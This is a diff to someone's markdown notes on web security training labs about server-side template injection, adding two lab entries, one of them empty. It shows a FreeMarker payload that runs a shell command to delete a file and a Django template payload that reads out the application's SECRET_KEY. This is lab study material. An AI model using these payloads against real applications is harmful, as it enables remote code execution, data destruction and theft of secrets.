@@ -970,11 +970,6 @@ It literally tells you where the holes are.
 
 
 
-
-
-
-
-
 ---
 
 # **`Labs`**
@@ -1107,6 +1102,44 @@ ${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}
 
 
 
+
+
+
+
+<details>
+  <summary>Lab: Server-side template injection in an unknown language with a documented exploit</summary>
+
+
+
+
+  
+</details>
+
+
+
+
+
+
+
+
+
+
+<details>
+  <summary>Lab: Server-side template injection with information disclosure via user-supplied objects</summary>
+
+
+1. login
+2. edit product
+
+```
+{{settings.SECRET_KEY}}
+```
+
+
+<img width="1499" height="799" alt="image" src="https://github.com/user-attachments/assets/68e07e42-4417-43da-9822-e6eab72629b9" />
+
+  
+</details>
 
 
 
